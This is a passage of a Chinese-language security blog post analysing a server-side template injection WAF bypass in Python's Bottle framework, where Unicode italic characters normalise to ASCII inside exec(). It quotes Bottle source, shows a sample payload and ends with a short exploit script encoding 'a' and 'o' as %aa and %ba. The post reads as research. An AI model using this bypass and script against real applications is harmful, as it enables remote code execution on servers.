+<p>这个_printlist就是在exec执行的全局空间里的打印函数。我们回顾一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">env.update(&#123;</span><br><span class="line">    &#x27;_stdout&#x27;: _stdout,</span><br><span class="line">    &#x27;_printlist&#x27;: _stdout.extend,</span><br><span class="line">    &#x27;include&#x27;: functools.partial(self._include, env),</span><br><span class="line">    &#x27;rebase&#x27;: functools.partial(self._rebase, env),</span><br><span class="line">    &#x27;_rebase&#x27;: None,</span><br><span class="line">    &#x27;_str&#x27;: self._str,</span><br><span class="line">    &#x27;_escape&#x27;: self._escape,</span><br><span class="line">    &#x27;get&#x27;: env.get,</span><br><span class="line">    &#x27;setdefault&#x27;: env.setdefault,</span><br><span class="line">    &#x27;defined&#x27;: env.__contains__</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>&#39;_printlist&#39;: _stdout.extend,</code>，好的，我们了解了<code>translate()</code>的大致用途了。我们接下来来看<code>flush_text()</code>，存在如下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parts.append(self.process_inline(m.group(1).strip()))</span><br></pre></td></tr></table></figure>
+
+<p>每一行模板都会经过一次<code>self.process_inline()</code>，跟进：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@staticmethod</span><br><span class="line">def process_inline(chunk):</span><br><span class="line">    if chunk[0] == &#x27;!&#x27;: return &#x27;_str(%s)&#x27; % chunk[1:]</span><br><span class="line">    return &#x27;_escape(%s)&#x27; % chunk</span><br></pre></td></tr></table></figure>
+
+<p>终于，出现了与转码有关的<code>_escape</code>函数。我们对照刚才回顾的exec执行的全局空间。我们看到：<code>&#39;_escape&#39;: self._escape,</code>。我们去找SimpleTemplate类的<code>self._escape</code>看看。还记得每一次进入SimpleTemplate都有一次初始化吗，就是<code>prepare</code>函数这些，我们来看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def prepare(self,</span><br><span class="line">            escape_func=html_escape,</span><br><span class="line">            noescape=False,</span><br><span class="line">            syntax=None, **ka):</span><br><span class="line">    self.cache = &#123;&#125;</span><br><span class="line">    enc = self.encoding</span><br><span class="line">    self._str = lambda x: touni(x, enc)</span><br><span class="line">    self._escape = lambda x: escape_func(touni(x, enc))</span><br><span class="line">    self.syntax = syntax</span><br><span class="line">    if noescape:</span><br><span class="line">        self._str, self._escape = self._escape, self._str</span><br></pre></td></tr></table></figure>
+
+<p>可以看到初始化了<code>self._escape = lambda x: escape_func(touni(x, enc))</code></p>
+<p><code>touni()</code>是老熟人了，看<code>escape_func()</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escape_func=html_escape,</span><br></pre></td></tr></table></figure>
+
+<p>看定义在全局空间的<code>html_escape()</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def html_escape(string):</span><br><span class="line">    &quot;&quot;&quot; Escape HTML special characters ``&amp;&lt;&gt;`` and quotes ``&#x27;&quot;``. &quot;&quot;&quot;</span><br><span class="line">    return string.replace(&#x27;&amp;&#x27;, &#x27;&amp;amp;&#x27;).replace(&#x27;&lt;&#x27;, &#x27;&amp;lt;&#x27;).replace(&#x27;&gt;&#x27;, &#x27;&amp;gt;&#x27;)\</span><br><span class="line">                 .replace(&#x27;&quot;&#x27;, &#x27;&amp;quot;&#x27;).replace(&quot;&#x27;&quot;, &#x27;&amp;#039;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>就是一个防止XSS的HTML编码函数。</p>
+<p>至此我们得出结论：<strong>我们的输入，不论在不在{{}}里，经过唯一的编码检查就是对source的<code>touni()</code>，但是由于全局变量中的unicode在python3下是全体str，这就导致了我们可以输入斜体字符</strong></p>
+<h2 id="为什么斜体字符能够被正确执行？"><a href="#为什么斜体字符能够被正确执行？" class="headerlink" title="为什么斜体字符能够被正确执行？"></a>为什么斜体字符能够被正确执行？</h2><p>我们都知道，最后的代码由python的<code>exec()</code>执行。那么为什么可以执行带有斜体字符的代码呢？</p>
+<p>这就要聊到python的机制了。其实在XYCTF的wp里我也有聊过。如图：</p>
+<p><img src="/images/migrated/18805019/07.png"></p>
+<p>假如直接<code>exec()</code>任意code的话，python会把code中当作代码处理的斜体字根据<code>Decomposition</code>转成对应的ASCII字符（当作字符串处理的除外，如此例中，假如whoami或os为斜体，则会无法执行，因为找不到斜体的os库，和斜体的whoami命令）</p>
+<p>至此，利用链成立。</p>
+<h2 id="如何传入？"><a href="#如何传入？" class="headerlink" title="如何传入？"></a>如何传入？</h2><p>但是，为什么（至少我）只有两个字符<code>ª</code> (U+00AA)，<code>º</code> (U+00BA)成功了呢？</p>
+<p>这是因为沟槽的URL编码。这些特殊字符经过URL编码之后一个字符都必须以两个编码值表示。但是bottle在解析编码值的时候是按照一个编码值对应一个字符进行解析的。所以往往一个这些字符都会被识别成两个字符。到目前为止我还没找到一种能把斜体字符从前端传到后端的解决办法（哭）。我目前测试成功的只有位于U+0080（<code>&lt;Padding Character&gt; (PAD)</code>）-U+00BF（<code>¿</code>）区间的字符，也就是Latin-1 Supplement的一半，不难发现他们的URL编码都由%c2开头，后面再跟一个编码值。**利用的时候只需要将开头的%c2删去就可以成功将原字符传入后端。**其中只有<code>ª</code> (U+00AA)，<code>º</code> (U+00BA)，<code>¹</code> (U+00B9)，<code>²</code> (U+00B2)，<code>³</code> (U+00B3)有用，其中<code>¹</code> (U+00B9)，<code>²</code> (U+00B2)，<code>³</code> (U+00B3)在<code>exec()</code>时不会被python正确解析。而<code>ª</code> (U+00AA)，<code>º</code> (U+00BA)执行的时候等效于字符<code>a</code>,<code>o</code>，别的字符RCE根本用不上。</p>
+<h1 id="Special-Tricks-特殊利用"><a href="#Special-Tricks-特殊利用" class="headerlink" title="Special Tricks (特殊利用)"></a>Special Tricks (特殊利用)</h1><p>我们在上文中提到了如何传入的问题。因为这个问题大大地限制了此种利用方式。但是我们也不难推知，以下payload成立：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return bottle.template(&#x27;&#123;&#123;𝒶𝒷𝓈(-1)&#125;&#125;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18805019/08.png"></p>
+<p>因此我们所有的问题都聚焦在如何将斜体字符传入template中。之前聊过，因为get（post）传参特殊字符必须进行URL编码的原因，我们无法传入这种斜体字符。但是假设靶机提供了一种可以不使用URL编码的方式将可控输入传入template（如：上传文件，再渲染文件中的内容形成的SSTI）那就意味着所有的字符可以全部用各种斜体替换（是的，一个ASCII的斜体字符至少4种），那就真的超模了。</p>
+<p>对于任意ASCII字母都至少可以在<a target="_blank" rel="noopener" href="https://exotictext.com/zh-cn/italic/%E4%B8%8A%E6%89%BE%E5%88%B0%E5%9B%9B%E7%A7%8D%E5%AF%B9%E5%BA%94%E7%9A%84%E6%96%9C%E4%BD%93%E3%80%82%E5%9C%A8python%E4%B8%AD%E9%83%BD%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%BD%93%E6%88%90ASCII%E6%AD%A3%E5%B8%B8%E6%89%A7%E8%A1%8C%E3%80%82%E5%81%87%E8%AE%BE%E6%88%91%E4%BB%AC%E8%83%BD%E6%8A%8A%E8%BF%99%E4%BA%9B%E4%B8%9C%E8%A5%BF%E4%BC%A0%E5%88%B0%E5%90%8E%E7%AB%AF%EF%BC%8C%E4%B8%8D%E4%BC%9A%E8%A7%A6%E5%8F%91%E9%92%88%E5%AF%B9%E8%AF%A5%E5%AD%97%E7%AC%A6%E7%9A%84waf%EF%BC%8Cbottle%E6%B8%B2%E6%9F%93%E5%AE%8C%E6%88%90%E5%90%8E%E5%B0%B1%E4%BC%9A%E7%9B%B4%E6%8E%A5%E8%BF%9B%E5%85%A5exec%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%AD%A3%E5%B8%B8RCE%E3%80%82">https://exotictext.com/zh-cn/italic/上找到四种对应的斜体。在python中都可以直接当成ASCII正常执行。假设我们能把这些东西传到后端，不会触发针对该字符的waf，bottle渲染完成后就会直接进入exec，可以正常RCE。</a></p>
+<h1 id="Exploit-Development-exp"><a href="#Exploit-Development-exp" class="headerlink" title="Exploit Development (exp)"></a>Exploit Development (exp)</h1><p>至少，对于最初级的用法。假设我们必须要在URL编码的限制下SSTI，我们依然有两个字符可以换。有如下exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">def replace_unquoted(text):</span><br><span class="line">    pattern = r&#x27;(\&#x27;.*?\&#x27;|\&quot;.*?\&quot;)|([oa])&#x27;</span><br><span class="line">    </span><br><span class="line">    def replacement(match):</span><br><span class="line">        if match.group(1):</span><br><span class="line">            return match.group(1)</span><br><span class="line">        else:</span><br><span class="line">            char = match.group(2)</span><br><span class="line">            replacements = &#123;</span><br><span class="line">                &#x27;o&#x27;: &#x27;%ba&#x27;,</span><br><span class="line">                &#x27;a&#x27;: &#x27;%aa&#x27;,</span><br><span class="line">            &#125;</span><br><span class="line">            return replacements.get(char, char)</span><br><span class="line">    </span><br><span class="line">    result = re.sub(pattern, replacement, text)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">input_text = &#x27;&#x27; # payload</span><br><span class="line">output_text = replace_unquoted(input_text)</span><br><span class="line">print(&quot;处理后的字符串:&quot;, output_text)</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Proof-of-Concept-PoC"><span class="toc-number">1.</span> <span class="toc-text">Proof of Concept (PoC)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Root-Cause%EF%BC%88%E5%8E%9F%E7%90%86%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">Root Cause（原理）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E2%80%9C%E6%96%9C%E4%BD%93%E5%AD%97%E2%80%9D"><span class="toc-number">2.1.</span> <span class="toc-text">什么是“斜体字”</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%AF%E4%BB%A5%E8%BE%93%E5%85%A5%E6%96%9C%E4%BD%93%E5%AD%97%E7%AC%A6%EF%BC%9F"><span class="toc-number">2.2.</span> <span class="toc-text">为什么可以输入斜体字符？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%96%9C%E4%BD%93%E5%AD%97%E7%AC%A6%E8%83%BD%E5%A4%9F%E8%A2%AB%E6%AD%A3%E7%A1%AE%E6%89%A7%E8%A1%8C%EF%BC%9F"><span class="toc-number">2.3.</span> <span class="toc-text">为什么斜体字符能够被正确执行？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E4%BC%A0%E5%85%A5%EF%BC%9F"><span class="toc-number">2.4.</span> <span class="toc-text">如何传入？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Special-Tricks-%E7%89%B9%E6%AE%8A%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">Special Tricks (特殊利用)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploit-Development-exp"><span class="toc-number">4.</span> <span class="toc-text">Exploit Development (exp)</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/&text=聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/&title=聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/&is_video=false&description=聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass&body=Check out this article: https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/&title=聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/&title=聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/&title=聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/&title=聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/&name=聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/&t=聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
